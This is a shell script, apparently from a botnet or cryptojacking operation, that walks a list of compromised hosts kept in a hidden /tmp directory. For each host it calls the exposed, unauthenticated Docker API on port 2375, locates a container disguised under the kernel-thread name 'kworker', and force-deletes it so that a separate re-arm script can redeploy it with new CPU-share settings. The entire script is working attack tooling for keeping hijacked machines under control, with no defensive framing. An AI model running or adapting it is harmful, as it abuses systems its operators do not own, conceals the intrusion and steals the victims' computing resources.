#!/bin/sh
# Delete our container on every host we own - version-pinned so the next dock.sh re-arm
# re-creates it with the CURRENT flags/CpuShares. /containers/<name>/json 404s on old
# engines and api proxies, so resolve the id from the (static) container list instead.
W=/tmp/.sysd/.hunt
exec > /tmp/_upg2.out 2>&1
n=0; dead=0; miss=0
while read -r ip rest; do
    [ -n "$ip" ] || continue
    v=$(curl -fsS -m 5 "http://$ip:2375/version" 2>/dev/null) || v=""
    case "$v" in *ApiVersion*) ;; *) dead=$((dead + 1)); continue ;; esac
    a=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
    if [ -n "$a" ]; then u="http://$ip:2375/v$a"; else u="http://$ip:2375"; fi
    l=$(curl -fsS -m 6 "$u/containers/json?all=1" 2>/dev/null) || l=""
    line=$(printf '%s' "$l" | grep -m1 '"/kworker"')
    id=$(printf '%s' "$line" | grep -o '"Id":"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
    if [ -z "$id" ]; then miss=$((miss + 1)); echo "$ip no-container"; continue; fi
    code=$(curl -sS -m 12 -o /dev/null -w '%{http_code}' -X DELETE "$u/containers/$id?force=1" 2>/dev/null)
    echo "$ip delete=$code"
    n=$((n + 1))
done < "$W/dock.owned"
echo "TOTAL deleted_attempts=$n no_container=$miss unreachable=$dead"
